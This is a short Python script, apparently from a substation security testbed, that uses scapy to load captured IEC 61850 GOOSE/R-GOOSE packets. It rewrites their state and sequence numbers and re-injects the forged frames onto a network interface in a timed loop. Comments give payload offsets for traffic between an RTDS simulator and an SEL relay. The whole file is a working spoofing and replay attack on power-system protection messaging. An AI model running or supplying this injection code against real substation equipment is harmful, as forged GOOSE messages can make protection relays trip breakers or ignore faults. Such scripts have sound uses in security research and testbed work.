from scapy.all import *
import goose
from time import sleep

packet = None
a = rdpcap("wireshark10.pcap")
for i in a:
	try:
        # if i.type == 0x88b8:
# your_iface = "enp3s0"
# i = sniff(iface=your_iface, count=1, filter = "udp and host 10.220.64.207 and port 49153")
# i = i[0]
		# i.show()
		# print (len(i.load))
		# print (len(i))
	# print (i.load)

		g = goose.GOOSE(i.load)
		pl1 = i.load[:40]
		# print (type(pl1))
		# print (len(i.load[:39]))
		# print (repr(g.load))
		gpdu = goose.GOOSEPDU(g.load[31:])
		print (gpdu.__dict__)
		for st in range(15,20):
			gpdu.__dict__['stNum'].data = st
			for j in range(1,100):
				gpdu.__dict__['sqNum'].data = j
				# print ("ENCODED = ")
				pl = gpdu.pack()
				# print (gpdu.__dict__)
				# print (pl)
				pl = pl1 + pl
				i[UDP].remove_payload()
				# i.show()
				i[UDP].add_payload(pl)
				i.show()
				# print (len(i.load))
				# print (len(i))
				packet = i
				sendp(packet, iface="enp3s0")
				sleep(0.02)
	# break
	except AttributeError:
		print ("AttributeError")
		continue
        # break

# for i in range(1):
# 	sendp(packet, iface="enp3s0")

# for RTDS to SEL - i.load[:10] and g.load[2:]
# for SEL to RTDS - i.load[:11] and g.load[3:]
# for RGOOSE : g.load[31:], for i.load, use multiple protocols, i.load[:40]